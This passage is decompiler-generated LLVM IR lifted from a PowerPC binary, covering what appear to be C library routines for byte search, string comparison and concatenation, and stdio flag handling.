  %v1_1000b814 = inttoptr i32 %arg2 to i32*
  %v2_1000b814 = load i32, i32* %v1_1000b814, align 4
  store i32 %v2_1000b814, i32* %r4.global-to-local, align 4
  %v2_1000b818 = sub i32 %storemerge, %v4_1000b810
  %v1_1000b81c = add i32 %arg2, 4
  %v2_1000b81c = inttoptr i32 %v1_1000b81c to i32*
  %v3_1000b81c = load i32, i32* %v2_1000b81c, align 4
  store i32 %v3_1000b81c, i32* %r5.global-to-local, align 4
  %v2_1000b820 = add i32 %v2_1000b818, %v0_1000b820
  store i32 %v2_1000b820, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_1000b820, 0
  %v1_1000b828 = zext i1 %tmp10 to i32
  %v2_1000b828 = ashr i32 %v2_1000b820, 31
  %v3_1000b828 = and i32 %v2_1000b828, -2
  %v4_1000b828 = or i32 %v3_1000b828, %v1_1000b828
  %v2_1000b82c = sub i32 %v3_1000b81c, %v2_1000b820
  %v3_1000b82c = sub i32 -1, %v2_1000b820
  store i32 %v2_1000b82c, i32* %r10.global-to-local, align 4
  %v6_1000b82c = icmp ule i32 %v2_1000b82c, %v3_1000b82c
  %v2_1000b830 = sub nsw i32 -1, %v4_1000b828
  %v3_1000b830 = add i32 %v2_1000b814, %v2_1000b830
  %v5_1000b830 = zext i1 %v6_1000b82c to i32
  %v6_1000b830 = add i32 %v3_1000b830, %v5_1000b830
  store i32 %v6_1000b830, i32* %v1_1000b814, align 4
  %v0_1000b838 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b838 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000b838 = add i32 %v1_1000b838, 4
  %v3_1000b838 = inttoptr i32 %v2_1000b838 to i32*
  store i32 %v0_1000b838, i32* %v3_1000b838, align 4
  %v0_1000b83c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000b83c = inttoptr i32 %v0_1000b83c to i32*
  %v2_1000b83c = load i32, i32* %v1_1000b83c, align 4
  %v1_1000b840 = load i32, i32* %r4.global-to-local, align 4
  %v3_1000b840 = icmp sgt i32 %v2_1000b83c, %v1_1000b840
  br i1 %v3_1000b840, label %dec_label_pc_1000b858, label %dec_label_pc_1000b848

dec_label_pc_1000b848:                            ; preds = %dec_label_pc_1000b7fc
  %v4_1000b840 = icmp eq i32 %v2_1000b83c, %v1_1000b840
  br i1 %v4_1000b840, label %dec_label_pc_1000b84c, label %dec_label_pc_1000b85cthread-pre-split

dec_label_pc_1000b84c:                            ; preds = %dec_label_pc_1000b848
  %v1_1000b84c = add i32 %v0_1000b83c, 4
  %v2_1000b84c = inttoptr i32 %v1_1000b84c to i32*
  %v3_1000b84c = load i32, i32* %v2_1000b84c, align 4
  %v1_1000b850 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000b850 = icmp ugt i32 %v3_1000b84c, %v1_1000b850
  br i1 %v3_1000b850, label %dec_label_pc_1000b858, label %dec_label_pc_1000b85cthread-pre-split

dec_label_pc_1000b858:                            ; preds = %dec_label_pc_1000b84c, %dec_label_pc_1000b7fc
  %v0_1000b858 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b858 = sub i32 0, %v0_1000b858
  store i32 %v1_1000b858, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b85c

dec_label_pc_1000b85cthread-pre-split:            ; preds = %dec_label_pc_1000b848, %dec_label_pc_1000b84c
  %v0_1000b85c.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b85c

dec_label_pc_1000b85c:                            ; preds = %dec_label_pc_1000b85cthread-pre-split, %dec_label_pc_1000b858
  %v0_1000b85c = phi i32 [ %v0_1000b85c.pr, %dec_label_pc_1000b85cthread-pre-split ], [ %v1_1000b858, %dec_label_pc_1000b858 ]
  %tmp8 = icmp sgt i32 %v0_1000b85c, -1
  br i1 %tmp8, label %dec_label_pc_1000b878, label %dec_label_pc_1000b864

dec_label_pc_1000b864:                            ; preds = %dec_label_pc_1000b85c
  %v0_1000b864 = call i32 @function_10004b48()
  %v2_1000b86c = inttoptr i32 %v0_1000b864 to i32*
  store i32 75, i32* %v2_1000b86c, align 4
  %v0_1000b87c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b878

dec_label_pc_1000b874:                            ; preds = %dec_label_pc_1000b7d0, %dec_label_pc_1000b7c8
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b878

dec_label_pc_1000b878:                            ; preds = %dec_label_pc_1000b85c, %dec_label_pc_1000b864, %dec_label_pc_1000b874
  %v0_1000b87c = phi i32 [ %v0_1000b85c, %dec_label_pc_1000b85c ], [ %v0_1000b87c.pre, %dec_label_pc_1000b864 ], [ -1, %dec_label_pc_1000b874 ]
  ret i32 %v0_1000b87c

; uselistorder directives
  uselistorder i32 %v2_1000b83c, { 1, 0 }
  uselistorder i32 %v2_1000b820, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 3, 4, 1, 2, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000b878, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b85cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1000b7fc, { 4, 0, 1, 2, 3 }
}

define i32 @function_1000b890(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b890:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000b890 = load i32, i32* @lr, align 4
  store i32 %v0_1000b890, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000b8a4 = add i32 %arg1, 8
  %v2_1000b8a4 = inttoptr i32 %v1_1000b8a4 to i32*
  %v3_1000b8a4 = load i32, i32* %v2_1000b8a4, align 4
  %v1_1000b8a8 = add i32 %arg1, 12
  %v2_1000b8a8 = inttoptr i32 %v1_1000b8a8 to i32*
  %v3_1000b8a8 = load i32, i32* %v2_1000b8a8, align 4
  %v2_1000b8ac = sub i32 %v3_1000b8a8, %v3_1000b8a4
  store i32 268482740, i32* @lr, align 4
  %v3_1000b8b0 = inttoptr i32 %v3_1000b8a4 to i16*
  %v4_1000b8b0 = call i32 @function_1000b720(i16* %v3_1000b8b0, i32 %v2_1000b8ac, i32 %v2_1000b8ac)
  %v0_1000b8b4 = load i32, i32* @r29, align 4
  %v1_1000b8b4 = add i32 %v0_1000b8b4, 8
  %v2_1000b8b4 = inttoptr i32 %v1_1000b8b4 to i32*
  %v3_1000b8b4 = load i32, i32* %v2_1000b8b4, align 4
  %v2_1000b8b8 = add i32 %v3_1000b8b4, %v4_1000b8b0
  store i32 %v2_1000b8b8, i32* %r0.global-to-local, align 4
  %v2_1000b8bc = add i32 %v0_1000b8b4, 16
  %v3_1000b8bc = inttoptr i32 %v2_1000b8bc to i32*
  store i32 %v3_1000b8b4, i32* %v3_1000b8bc, align 4
  %v0_1000b8c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b8c0 = load i32, i32* @r29, align 4
  %v2_1000b8c0 = add i32 %v1_1000b8c0, 20
  %v3_1000b8c0 = inttoptr i32 %v2_1000b8c0 to i32*
  store i32 %v0_1000b8c0, i32* %v3_1000b8c0, align 4
  store i32 %v0_1000b890, i32* %r0.global-to-local, align 4
  ret i32 %v4_1000b8b0

; uselistorder directives
  uselistorder i32 %v3_1000b8b4, { 1, 0 }
  uselistorder i32 %v4_1000b8b0, { 1, 0 }
  uselistorder i32 %v3_1000b8a4, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_1000b8d8(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b8d8:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1000b8e0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000b8ec = load i16, i16* %arg1, align 2
  %v4_1000b8ec = zext i16 %v3_1000b8ec to i32
  %v2_1000b8f0 = and i32 %v4_1000b8ec, %arg2
  %v5_1000b8f0 = icmp eq i32 %v2_1000b8f0, 0
  br i1 %v5_1000b8f0, label %dec_label_pc_1000b8f8, label %dec_label_pc_1000b908

dec_label_pc_1000b8f8:                            ; preds = %dec_label_pc_1000b8d8
  %v1_1000b8f8 = and i32 %v4_1000b8ec, 2176
  %v3_1000b8f8 = icmp eq i32 %v1_1000b8f8, 0
  br i1 %v3_1000b8f8, label %dec_label_pc_1000b900, label %dec_label_pc_1000b914

dec_label_pc_1000b900:                            ; preds = %dec_label_pc_1000b8f8
  %v2_1000b900 = or i32 %v4_1000b8ec, %arg2
  %v1_1000b904 = trunc i32 %v2_1000b900 to i16
  store i16 %v1_1000b904, i16* %arg1, align 2
  %v0_1000b908.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b908

dec_label_pc_1000b908:                            ; preds = %dec_label_pc_1000b8d8, %dec_label_pc_1000b900
  %v0_1000b908 = phi i32 [ %tmp, %dec_label_pc_1000b8d8 ], [ %v0_1000b908.pre, %dec_label_pc_1000b900 ]
  %v1_1000b908 = inttoptr i32 %v0_1000b908 to i16*
  %v2_1000b908 = load i16, i16* %v1_1000b908, align 2
  %v3_1000b908 = zext i16 %v2_1000b908 to i32
  %v1_1000b90c = and i32 %v3_1000b908, 16
  %v3_1000b90c = icmp eq i32 %v1_1000b90c, 0
  br i1 %v3_1000b90c, label %dec_label_pc_1000b930, label %dec_label_pc_1000b914

dec_label_pc_1000b914:                            ; preds = %dec_label_pc_1000b8f8, %dec_label_pc_1000b908
  %v0_1000b914 = call i32 @function_10004b48()
  store i32 %v0_1000b914, i32* %r3.global-to-local, align 4
  %v2_1000b91c = inttoptr i32 %v0_1000b914 to i32*
  store i32 9, i32* %v2_1000b91c, align 4
  br label %dec_label_pc_1000b920

dec_label_pc_1000b920:                            ; preds = %dec_label_pc_1000b938, %dec_label_pc_1000b914
  %v0_1000b920 = load i32, i32* @r31, align 4
  %v1_1000b920 = inttoptr i32 %v0_1000b920 to i16*
  %v2_1000b920 = load i16, i16* %v1_1000b920, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000b928 = or i16 %v2_1000b920, 8
  br label %dec_label_pc_1000b964

dec_label_pc_1000b930:                            ; preds = %dec_label_pc_1000b908
  %v1_1000b930 = and i32 %v3_1000b908, 64
  %v3_1000b930 = icmp eq i32 %v1_1000b930, 0
  br i1 %v3_1000b930, label %dec_label_pc_1000b958, label %dec_label_pc_1000b938

dec_label_pc_1000b938:                            ; preds = %dec_label_pc_1000b930
  store i32 268482876, i32* @lr, align 4
  %v0_1000b938 = call i32 @function_10005544()
  store i32 %v0_1000b938, i32* %r3.global-to-local, align 4
  %v3_1000b93c = icmp eq i32 %v0_1000b938, 0
  br i1 %v3_1000b93c, label %dec_label_pc_1000b944, label %dec_label_pc_1000b920

dec_label_pc_1000b944:                            ; preds = %dec_label_pc_1000b938
  %v0_1000b944 = load i32, i32* @r31, align 4
  %v1_1000b944 = inttoptr i32 %v0_1000b944 to i16*
  %v2_1000b944 = load i16, i16* %v1_1000b944, align 2
  %v3_1000b944 = zext i16 %v2_1000b944 to i32
  %v1_1000b948 = add i32 %v0_1000b944, 8
  %v2_1000b948 = inttoptr i32 %v1_1000b948 to i32*
  %v3_1000b948 = load i32, i32* %v2_1000b948, align 4
  %v1_1000b94c = call i32 @__asm_rlwinm(i32 %v3_1000b944, i32 0, i32 26, i32 24)
  %v2_1000b94c = trunc i32 %v1_1000b94c to i16
  %v1_1000b950 = load i32, i32* @r31, align 4
  %v2_1000b950 = add i32 %v1_1000b950, 28
  %v3_1000b950 = inttoptr i32 %v2_1000b950 to i32*
  store i32 %v3_1000b948, i32* %v3_1000b950, align 4
  %v3_1000b954 = load i32, i32* @r31, align 4
  %v4_1000b954 = inttoptr i32 %v3_1000b954 to i16*
  store i16 %v2_1000b94c, i16* %v4_1000b954, align 2
  %v0_1000b958.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b958

dec_label_pc_1000b958:                            ; preds = %dec_label_pc_1000b930, %dec_label_pc_1000b944
  %v0_1000b958 = phi i32 [ %v0_1000b908, %dec_label_pc_1000b930 ], [ %v0_1000b958.pre, %dec_label_pc_1000b944 ]
  %v1_1000b958 = inttoptr i32 %v0_1000b958 to i16*
  %v2_1000b958 = load i16, i16* %v1_1000b958, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000b960 = or i16 %v2_1000b958, 1
  br label %dec_label_pc_1000b964

dec_label_pc_1000b964:                            ; preds = %dec_label_pc_1000b920, %dec_label_pc_1000b958
  %v2_1000b964 = phi i32 [ %v0_1000b920, %dec_label_pc_1000b920 ], [ %v0_1000b958, %dec_label_pc_1000b958 ]
  %storemerge.off0 = phi i16 [ %v1_1000b928, %dec_label_pc_1000b920 ], [ %v1_1000b960, %dec_label_pc_1000b958 ]
  %v3_1000b964 = inttoptr i32 %v2_1000b964 to i16*
  store i16 %storemerge.off0, i16* %v3_1000b964, align 2
  store i32 %v0_1000b8e0, i32* @r31, align 4
  %v0_1000b978 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b978

; uselistorder directives
  uselistorder i32 %v4_1000b8ec, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 26, { 4, 1, 2, 3, 5, 6, 7, 0 }
  uselistorder i32 ()* @function_10005544, { 8, 5, 2, 1, 4, 3, 7, 6, 0 }
  uselistorder i32 64, { 0, 4, 5, 6, 7, 1, 2, 8, 3 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b964, { 1, 0 }
  uselistorder label %dec_label_pc_1000b958, { 1, 0 }
  uselistorder label %dec_label_pc_1000b914, { 1, 0 }
  uselistorder label %dec_label_pc_1000b908, { 1, 0 }
}

define i32 @function_1000b97c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b97c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_1000b97c = load i32, i32* @lr, align 4
  store i32 %v0_1000b97c, i32* %r0.global-to-local, align 4
  %v0_1000b988 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_1000b994 = add i32 %arg1, 4
  %v2_1000b994 = inttoptr i32 %v1_1000b994 to i32*
  %v3_1000b994 = load i32, i32* %v2_1000b994, align 4
  %v2_1000b998 = load i32, i32* %arg2, align 4
  %v1_1000b99c = add i32 %tmp, 4
  %v2_1000b99c = inttoptr i32 %v1_1000b99c to i32*
  %v3_1000b99c = load i32, i32* %v2_1000b99c, align 4
  store i32 268482980, i32* @lr, align 4
  %v4_1000b9a0 = call i32 @function_1000c9e4(i32 %v3_1000b994, i32 %v2_1000b998, i32 %v3_1000b99c, i32 %arg3)
  %v1_1000b9a4 = icmp slt i32 %v4_1000b9a0, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_1000b9a4, label %dec_label_pc_1000b9bc, label %dec_label_pc_1000b9b0

dec_label_pc_1000b9b0:                            ; preds = %dec_label_pc_1000b97c
  %v1_1000b9b0 = load i32, i32* @r31, align 4
  %v2_1000b9b0 = inttoptr i32 %v1_1000b9b0 to i32*
  store i32 %v4_1000b9a0, i32* %v2_1000b9b0, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000b9b8 = load i32, i32* @r31, align 4
  %v2_1000b9b8 = add i32 %v1_1000b9b8, 4
  %v3_1000b9b8 = inttoptr i32 %v2_1000b9b8 to i32*
  store i32 %tmp, i32* %v3_1000b9b8, align 4
  %v0_1000b9bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b9bc

dec_label_pc_1000b9bc:                            ; preds = %dec_label_pc_1000b97c, %dec_label_pc_1000b9b0
  %v0_1000b9bc = phi i32 [ %tmp, %dec_label_pc_1000b97c ], [ %v0_1000b9bc.pre, %dec_label_pc_1000b9b0 ]
  store i32 %v0_1000b97c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000b988, i32* @r31, align 4
  ret i32 %v0_1000b9bc

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_1000b9bc, { 1, 0 }
}

define i32 @function_1000b9d4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b9d4:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000b9d4 = urem i32 %arg1, 256
  store i32 %v1_1000b9d4, i32* %r4.global-to-local, align 4
  %v0_1000b9ec1 = load i32, i32* @r3, align 4
  %v1_1000b9ec2 = urem i32 %v0_1000b9ec1, 4
  %v3_1000b9ec4 = icmp eq i32 %v1_1000b9ec2, 0
  br i1 %v3_1000b9ec4, label %dec_label_pc_1000b9f4, label %dec_label_pc_1000b9dc

dec_label_pc_1000b9dc:                            ; preds = %dec_label_pc_1000b9d4, %dec_label_pc_1000b9dc
  %v1_1000b9e0 = phi i32 [ %v0_1000b9f4.pre, %dec_label_pc_1000b9dc ], [ %v1_1000b9d4, %dec_label_pc_1000b9d4 ]
  %v0_1000b9dc = phi i32 [ %v1_1000b9e8, %dec_label_pc_1000b9dc ], [ %v0_1000b9ec1, %dec_label_pc_1000b9d4 ]
  %v1_1000b9dc = inttoptr i32 %v0_1000b9dc to i8*
  %v2_1000b9dc = load i8, i8* %v1_1000b9dc, align 1
  %v3_1000b9dc = zext i8 %v2_1000b9dc to i32
  %v4_1000b9e0 = icmp eq i32 %v3_1000b9dc, %v1_1000b9e0
  %v0_1000b9e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000b9e0, i32 %v0_1000b9e4)
  %v0_1000b9e8 = load i32, i32* @r3, align 4
  %v1_1000b9e8 = add i32 %v0_1000b9e8, 1
  store i32 %v1_1000b9e8, i32* @r3, align 4
  %v1_1000b9ec = urem i32 %v1_1000b9e8, 4
  %v3_1000b9ec = icmp eq i32 %v1_1000b9ec, 0
  %v0_1000b9f4.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000b9ec, label %dec_label_pc_1000b9f4, label %dec_label_pc_1000b9dc

dec_label_pc_1000b9f4:                            ; preds = %dec_label_pc_1000b9dc, %dec_label_pc_1000b9d4
  %v0_1000ba0c9 = phi i32 [ %v0_1000b9ec1, %dec_label_pc_1000b9d4 ], [ %v1_1000b9e8, %dec_label_pc_1000b9dc ]
  %v0_1000b9f4 = phi i32 [ %v1_1000b9d4, %dec_label_pc_1000b9d4 ], [ %v0_1000b9f4.pre, %dec_label_pc_1000b9dc ]
  %v1_1000b9f4 = mul i32 %v0_1000b9f4, 256
  %v2_1000b9fc = or i32 %v1_1000b9f4, %v0_1000b9f4
  %v1_1000ba04 = mul i32 %v2_1000b9fc, 65536
  %v2_1000ba08 = or i32 %v1_1000ba04, %v2_1000b9fc
  br label %dec_label_pc_1000ba0c

dec_label_pc_1000ba0c:                            ; preds = %dec_label_pc_1000ba78, %dec_label_pc_1000ba0c, %dec_label_pc_1000b9f4
  %v0_1000ba48 = phi i32 [ %v0_1000ba0c9, %dec_label_pc_1000b9f4 ], [ %v1_1000ba10, %dec_label_pc_1000ba0c ], [ %v1_1000ba10, %dec_label_pc_1000ba78 ]
  %v1_1000ba0c = inttoptr i32 %v0_1000ba48 to i32*
  %v2_1000ba0c = load i32, i32* %v1_1000ba0c, align 4
  %v1_1000ba10 = add i32 %v0_1000ba48, 4
  %v1_1000ba14 = add i32 %v0_1000ba48, 2
  %v2_1000ba18 = xor i32 %v2_1000ba0c, %v2_1000ba08
  %v1_1000ba20 = add i32 %v2_1000ba18, 2130640639
  %v2_1000ba24 = xor i32 %v1_1000ba20, %v2_1000ba18
  %v1_1000ba28 = add i32 %v0_1000ba48, 1
  %v2_1000ba2c = and i32 %v2_1000ba24, -2130640640
  %v6_1000ba2c = icmp eq i32 %v2_1000ba2c, -2130640640
  br i1 %v6_1000ba2c, label %dec_label_pc_1000ba0c, label %dec_label_pc_1000ba38

dec_label_pc_1000ba38:                            ; preds = %dec_label_pc_1000ba0c
  %v2_1000ba38 = inttoptr i32 %v0_1000ba48 to i8*
  %v3_1000ba38 = load i8, i8* %v2_1000ba38, align 1
  %v4_1000ba38 = zext i8 %v3_1000ba38 to i32
  %v1_1000ba3c = add i32 %v0_1000ba48, 3
  %v4_1000ba40 = icmp eq i32 %v4_1000ba38, %v0_1000b9f4
  br i1 %v4_1000ba40, label %dec_label_pc_1000ba48, label %dec_label_pc_1000ba50

dec_label_pc_1000ba48:                            ; preds = %dec_label_pc_1000ba38
  ret i32 %v0_1000ba48

dec_label_pc_1000ba50:                            ; preds = %dec_label_pc_1000ba38
  %v2_1000ba50 = inttoptr i32 %v1_1000ba28 to i8*
  %v3_1000ba50 = load i8, i8* %v2_1000ba50, align 1
  %v4_1000ba50 = zext i8 %v3_1000ba50 to i32
  %v4_1000ba54 = icmp eq i32 %v4_1000ba50, %v0_1000b9f4
  br i1 %v4_1000ba54, label %dec_label_pc_1000ba5c, label %dec_label_pc_1000ba64

dec_label_pc_1000ba5c:                            ; preds = %dec_label_pc_1000ba50
  ret i32 %v1_1000ba28

dec_label_pc_1000ba64:                            ; preds = %dec_label_pc_1000ba50
  %v2_1000ba64 = inttoptr i32 %v1_1000ba14 to i8*
  %v3_1000ba64 = load i8, i8* %v2_1000ba64, align 1
  %v4_1000ba64 = zext i8 %v3_1000ba64 to i32
  %v4_1000ba68 = icmp eq i32 %v4_1000ba64, %v0_1000b9f4
  br i1 %v4_1000ba68, label %dec_label_pc_1000ba70, label %dec_label_pc_1000ba78

dec_label_pc_1000ba70:                            ; preds = %dec_label_pc_1000ba64
  ret i32 %v1_1000ba14

dec_label_pc_1000ba78:                            ; preds = %dec_label_pc_1000ba64
  %v2_1000ba78 = inttoptr i32 %v1_1000ba3c to i8*
  %v3_1000ba78 = load i8, i8* %v2_1000ba78, align 1
  %v4_1000ba78 = zext i8 %v3_1000ba78 to i32
  %v4_1000ba7c = icmp eq i32 %v4_1000ba78, %v0_1000b9f4
  br i1 %v4_1000ba7c, label %dec_label_pc_1000ba84, label %dec_label_pc_1000ba0c

dec_label_pc_1000ba84:                            ; preds = %dec_label_pc_1000ba78
  ret i32 %v1_1000ba3c

; uselistorder directives
  uselistorder i32 %v1_1000ba10, { 1, 0 }
  uselistorder i32 %v0_1000ba48, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_1000b9fc, { 1, 0 }
  uselistorder i32 %v0_1000b9f4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000b9e8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000b9ec1, { 2, 1, 0 }
  uselistorder i32 %v1_1000b9d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b9dc, { 1, 0 }
}

define i32 @function_1000ba8c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000ba8c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000ba98.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000ba90

dec_label_pc_1000ba90:                            ; preds = %dec_label_pc_1000bab4, %dec_label_pc_1000ba8c
  %v0_1000ba98 = phi i32 [ %v1_1000ba9c, %dec_label_pc_1000bab4 ], [ %v0_1000ba98.pre, %dec_label_pc_1000ba8c ]
  %v0_1000ba90 = phi i32 [ %v1_1000ba94, %dec_label_pc_1000bab4 ], [ %tmp, %dec_label_pc_1000ba8c ]
  %v1_1000ba90 = inttoptr i32 %v0_1000ba90 to i8*
  %v2_1000ba90 = load i8, i8* %v1_1000ba90, align 1
  %v3_1000ba90 = zext i8 %v2_1000ba90 to i32
  %v1_1000ba98 = inttoptr i32 %v0_1000ba98 to i8*
  %v2_1000ba98 = load i8, i8* %v1_1000ba98, align 1
  %v3_1000ba98 = zext i8 %v2_1000ba98 to i32
  %v3_1000baa0 = icmp eq i8 %v2_1000ba90, 0
  br i1 %v3_1000baa0, label %dec_label_pc_1000baac, label %dec_label_pc_1000bab4

dec_label_pc_1000baac:                            ; preds = %dec_label_pc_1000ba90
  %v1_1000baac = sub nsw i32 0, %v3_1000ba98
  ret i32 %v1_1000baac

dec_label_pc_1000bab4:                            ; preds = %dec_label_pc_1000ba90
  %v4_1000baa4 = icmp eq i8 %v2_1000ba90, %v2_1000ba98
  %v1_1000ba9c = add i32 %v0_1000ba98, 1
  %v1_1000ba94 = add i32 %v0_1000ba90, 1
  br i1 %v4_1000baa4, label %dec_label_pc_1000ba90, label %dec_label_pc_1000bab8

dec_label_pc_1000bab8:                            ; preds = %dec_label_pc_1000bab4
  %v2_1000bab8 = sub nsw i32 %v3_1000ba90, %v3_1000ba98
  ret i32 %v2_1000bab8

; uselistorder directives
  uselistorder i32 %v3_1000ba98, { 1, 0 }
  uselistorder i32 %v0_1000ba90, { 1, 0 }
  uselistorder i32 %v0_1000ba98, { 1, 0 }
}

define i32 @function_1000bac0(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000bac0:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000bac4

dec_label_pc_1000bac4:                            ; preds = %dec_label_pc_1000bac4, %dec_label_pc_1000bac0
  %v0_1000bac4 = phi i32 [ %v1_1000bac8, %dec_label_pc_1000bac4 ], [ %tmp, %dec_label_pc_1000bac0 ]
  %v1_1000bac4 = inttoptr i32 %v0_1000bac4 to i8*
  %v2_1000bac4 = load i8, i8* %v1_1000bac4, align 1
  %v1_1000bac8 = add i32 %v0_1000bac4, 1
  store i32 %v1_1000bac8, i32* %r11.global-to-local, align 4
  %v3_1000bacc = icmp eq i8 %v2_1000bac4, 0
  store i1 %v3_1000bacc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000bacc, label %dec_label_pc_1000bad4, label %dec_label_pc_1000bac4

dec_label_pc_1000bad4:                            ; preds = %dec_label_pc_1000bac4
  %v3_1000bad4 = icmp eq i32 %arg2, 3
  store i1 %v3_1000bad4, i1* %cr7_eq.global-to-local, align 1
  %v1_1000bad8 = add i32 %v0_1000bac4, -1
  store i32 %v1_1000bad8, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_1000bb74, label %dec_label_pc_1000bae4

dec_label_pc_1000bae4:                            ; preds = %dec_label_pc_1000bad4
  %v1_1000bae4 = udiv i32 %arg2, 4
  store i32 %v1_1000bae4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000baec

dec_label_pc_1000baec:                            ; preds = %dec_label_pc_1000baec.dec_label_pc_1000baec_crit_edge, %dec_label_pc_1000bae4
  %v2_1000bafc = phi i32 [ %v0_1000baf0.pre, %dec_label_pc_1000baec.dec_label_pc_1000baec_crit_edge ], [ %v1_1000bad8, %dec_label_pc_1000bae4 ]
  %v0_1000baec = load i32, i32* @r4, align 4
  %v1_1000baec = inttoptr i32 %v0_1000baec to i8*
  %v2_1000baec = load i8, i8* %v1_1000baec, align 1
  %v1_1000baf0 = add i32 %v2_1000bafc, 1
  store i32 %v1_1000baf0, i32* %r9.global-to-local, align 4
  %v1_1000baf4 = add i32 %v2_1000bafc, 2
  store i32 %v1_1000baf4, i32* %r7.global-to-local, align 4
  %v3_1000baf8 = icmp eq i8 %v2_1000baec, 0
  store i1 %v3_1000baf8, i1* %cr7_eq.global-to-local, align 1
  %v4_1000bafc = inttoptr i32 %v1_1000baf0 to i8*
  store i8 %v2_1000baec, i8* %v4_1000bafc, align 1
  %v0_1000bb00 = load i32, i32* @r4, align 4
  %v1_1000bb00 = add i32 %v0_1000bb00, 1
  store i32 %v1_1000bb00, i32* %r11.global-to-local, align 4
  %v0_1000bb04 = load i32, i32* @lr, align 4
  %v1_1000bb04 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000bb04, i32 %v0_1000bb04)
  %v0_1000bb08 = load i32, i32* @r4, align 4
  %v1_1000bb08 = add i32 %v0_1000bb08, 1
  %v2_1000bb08 = inttoptr i32 %v1_1000bb08 to i8*
  %v3_1000bb08 = load i8, i8* %v2_1000bb08, align 1
  %v0_1000bb0c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bb0c = add i32 %v0_1000bb0c, 1
  store i32 %v1_1000bb0c, i32* %r8.global-to-local, align 4
  %v0_1000bb10 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000bb10 = add i32 %v0_1000bb10, 1
  store i32 %v1_1000bb10, i32* %r10.global-to-local, align 4
  %v3_1000bb14 = icmp eq i8 %v3_1000bb08, 0
  store i1 %v3_1000bb14, i1* %cr7_eq.global-to-local, align 1
  %v2_1000bb18 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000bb18 = add i32 %v2_1000bb18, 1
  %v4_1000bb18 = inttoptr i32 %v3_1000bb18 to i8*
